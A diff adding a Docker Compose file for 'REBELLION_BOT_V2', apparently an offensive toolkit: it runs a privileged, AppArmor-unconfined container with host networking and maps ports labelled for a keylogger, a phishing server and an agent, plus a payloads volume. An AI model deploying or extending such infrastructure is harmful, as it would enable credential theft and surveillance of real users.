@@ -1,0 +1,35 @@
+# REBELLION_BOT_V2 - Docker Compose
+version: '3.8'
+
+services:
+  rebellion-bot:
+    build: .
+    container_name: rebellion_bot_v2
+    restart: unless-stopped
+    privileged: true  # Required for raw sockets (scapy)
+    network_mode: host  # For full network access
+    ports:
+      - "5000:5000"   # Web Dashboard
+      - "4444:4444"   # Keylogger
+      - "5555:5555"   # Agent
+      - "8080:8080"   # Phishing Server
+    volumes:
+      # Mount configuration and data directories
+      - ./config:/app/config
+      - ./data:/app/.rebellion
+      - ./reports:/app/rebellion_reports
+      - ./payloads:/app/.rebellion/payloads
+      - ./logs:/app/.rebellion
+      # Mount network interfaces for scapy
+      - /dev/net:/dev/net
+    environment:
+      - PYTHONUNBUFFERED=1
+      - REBELLION_ENV=docker
+      - TZ=UTC
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+      - SYS_ADMIN
+    security_opt:
+      - apparmor:unconfined
+    command: python rebellion_bot.py
